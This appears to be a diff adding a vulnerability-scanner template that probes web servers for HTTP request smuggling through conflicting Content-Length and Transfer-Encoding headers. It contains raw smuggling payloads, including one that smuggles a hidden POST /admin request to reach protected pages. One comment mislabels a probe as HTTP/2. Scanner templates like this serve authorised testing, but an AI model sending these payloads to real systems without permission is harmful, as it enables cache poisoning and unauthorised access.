@@ -1,0 +1,153 @@
+id: http-request-smuggling-candidate
+
+info:
+  name: HTTP Request Smuggling Candidate (CL.TE / TE.CL Desync)
+  author: p3i
+  severity: high
+  description: >
+    Probes for HTTP Request Smuggling vulnerabilities by sending ambiguous
+    requests that contain both Content-Length and Transfer-Encoding headers.
+    Modern proxies and load balancers can disagree on where a request ends when
+    both headers are present, allowing an attacker to "smuggle" a prefix of a
+    next request. This template tests two variants: CL.TE (front-end uses
+    Content-Length, back-end uses Transfer-Encoding) and TE.CL (front-end uses
+    Transfer-Encoding, back-end uses Content-Length). A timing difference or
+    unexpected response strongly indicates desynchronization. Requires manual
+    verification — timing-based detection produces false positives on slow
+    networks. Only investigate further if the server returns an unexpected
+    response or if consistent timing differences are observed across multiple runs.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+    - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+  tags: smuggling,http,desync,proxy,cl-te,te-cl,cache-poisoning
+  metadata:
+    max-request: 4
+
+http:
+  - raw:
+      # CL.TE probe: Content-Length says 6 bytes body, but TE chunked says 0 bytes
+      # If back-end uses TE, it reads "0\r\n\r\n" and stops, leaving "G" for next req
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+          - 505
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Unrecognized method"
+          - "Invalid method"
+          - "400 Bad Request"
+          - "GPOST"
+          - "Invalid HTTP"
+          - "method not allowed"
+
+  - raw:
+      # TE.CL probe: chunked body size is 0, but Content-Length says more data follows
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 3
+        Transfer-Encoding: chunked
+
+        1
+        Z
+        Q
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Invalid chunk"
+          - "Bad chunk"
+          - "Unrecognized"
+          - "ZPOST"
+          - "unexpected end"
+          - "parse error"
+
+  - raw:
+      # TE obfuscation probe: obfuscated Transfer-Encoding to bypass WAF normalization
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: xchunked
+
+        0
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+
+      - type: word
+        part: header
+        words:
+          - "Transfer-Encoding: chunked"
+          - "transfer-encoding: chunked"
+
+  - raw:
+      # HTTP/2 downgrade probe: checks if server accepts conflicting headers
+      - |
+        POST /admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+        Transfer-Encoding: chunked
+        Transfer-Encoding: cow
+
+        5e
+        POST /admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+          - "console"
+        case-insensitive: true
